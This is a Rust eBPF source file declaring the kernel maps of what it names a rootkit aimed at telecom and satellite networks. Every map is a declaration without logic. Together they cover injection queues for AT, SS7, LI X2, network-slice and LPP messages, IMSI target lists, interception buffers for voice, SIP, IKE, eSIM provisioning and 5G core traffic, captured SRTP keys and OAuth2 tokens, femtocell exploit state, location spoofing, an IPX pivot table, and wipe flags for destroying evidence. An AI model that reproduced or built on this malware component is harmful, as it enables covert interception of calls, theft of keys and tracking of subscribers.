use aya_ebpf::{
    macros::map,
    maps::{HashMap, RingBuf},
};
use common::{
    AdsbAircraftState, AkaAuthState, CellInfo, EsimProvisionCtx, FemtocellCtx, GnssSignalState,
    GtpTunnelState, HandoverCtx, ImsSipSession, LiInterfaceState, MimoBeamState, NetworkSliceInfo,
    NrfRegistration, NtnTimingState, RoamingState, RootkitConfig, RtpStreamState,
    SatelliteLinkState, SbiSessionState, SidelinkCtx, SignalingState, StarlinkSessionState,
    SuplSpoofState, VoWiFiTunnelState,
};

// ──────────────────────────────────────────────
// Core Infrastructure Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static CONFIG: HashMap<u32, RootkitConfig> = HashMap::with_max_entries(1, 0);

#[map]
pub(crate) static EVENTS: RingBuf = RingBuf::with_byte_size(256 * 1024, 0);

#[map]
pub(crate) static WIPE_FLAG: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

// ──────────────────────────────────────────────
// Category 5: Telecom Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static MODEM_FDS: HashMap<u32, u8> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static AT_CMD_INJECT_QUEUE: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static IMSI_TARGETS: HashMap<u64, u8> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static GTP_TUNNEL_STATE: HashMap<u32, GtpTunnelState> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static SS7_INJECT_QUEUE: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static DIAMETER_STATE: HashMap<u32, SignalingState> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static CELL_HISTORY: aya_ebpf::maps::Array<CellInfo> =
    aya_ebpf::maps::Array::with_max_entries(16, 0);

#[map]
pub(crate) static TELECOM_STATE: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(8, 0);

#[map]
pub(crate) static NAS_INTERCEPT_BUF: RingBuf = RingBuf::with_byte_size(64 * 1024, 0);

#[map]
pub(crate) static DOWNGRADE_TARGETS: HashMap<u32, u8> = HashMap::with_max_entries(32, 0);

// ──────────────────────────────────────────────
// Category 6: Advanced Telecom Maps (IMS/VoLTE/5G-Advanced)
// ──────────────────────────────────────────────

#[map]
pub(crate) static IMS_SIP_SESSIONS: HashMap<u64, ImsSipSession> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static RTP_STREAMS: HashMap<u32, RtpStreamState> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static RTP_CAPTURE_BUF: RingBuf = RingBuf::with_byte_size(128 * 1024, 0);

#[map]
pub(crate) static SRTP_KEY_MATERIAL: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static ESIM_PROVISION_STATE: HashMap<u64, EsimProvisionCtx> =
    HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static SMDP_INTERCEPT_BUF: RingBuf = RingBuf::with_byte_size(32 * 1024, 0);

#[map]
pub(crate) static NETWORK_SLICES: HashMap<u32, NetworkSliceInfo> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static SLICE_INJECT_QUEUE: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static VOWIFI_TUNNELS: HashMap<u64, VoWiFiTunnelState> =
    HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static IKE_INTERCEPT_BUF: RingBuf = RingBuf::with_byte_size(32 * 1024, 0);

#[map]
pub(crate) static LI_INTERFACES: HashMap<u32, LiInterfaceState> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static LI_X2_INJECT_QUEUE: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static FEMTOCELL_TARGETS: HashMap<u32, FemtocellCtx> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static FEMTO_EXPLOIT_STATE: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(4, 0);

#[map]
pub(crate) static SUPL_SPOOF_STATE: HashMap<u64, SuplSpoofState> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static LPP_INJECT_QUEUE: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static ROAMING_STATE: HashMap<u32, RoamingState> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static IPX_PIVOT_TARGETS: HashMap<u32, u32> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static SEPP_INTERCEPT_BUF: RingBuf = RingBuf::with_byte_size(32 * 1024, 0);

// ──────────────────────────────────────────────
// Category 7: 5G Advanced / RAN / SBI Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static SBI_SESSIONS: HashMap<u64, SbiSessionState> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static NRF_REGISTRATIONS: HashMap<u64, NrfRegistration> =
    HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static OAUTH2_TOKENS: HashMap<u64, u64> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static AKA_AUTH_STATE: HashMap<u64, AkaAuthState> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static SIDELINK_SESSIONS: HashMap<u32, SidelinkCtx> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static HANDOVER_CTX: HashMap<u32, HandoverCtx> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static MIMO_BEAMS: HashMap<u32, MimoBeamState> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static NEIGHBOR_CELLS: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static SBI_INTERCEPT_BUF: RingBuf = RingBuf::with_byte_size(64 * 1024, 0);

// ──────────────────────────────────────────────
// Category 8: Satellite Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static SATELLITE_LINK_STATE: HashMap<u32, SatelliteLinkState> =
    HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static GNSS_SIGNAL_STATE: HashMap<u32, GnssSignalState> =
    HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static NTN_TIMING_STATE: HashMap<u32, NtnTimingState> =
    HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static STARLINK_SESSIONS: HashMap<u64, StarlinkSessionState> =
    HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static ADSB_AIRCRAFT: HashMap<u32, AdsbAircraftState> =
    HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static SAT_WIPE_FLAG: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);
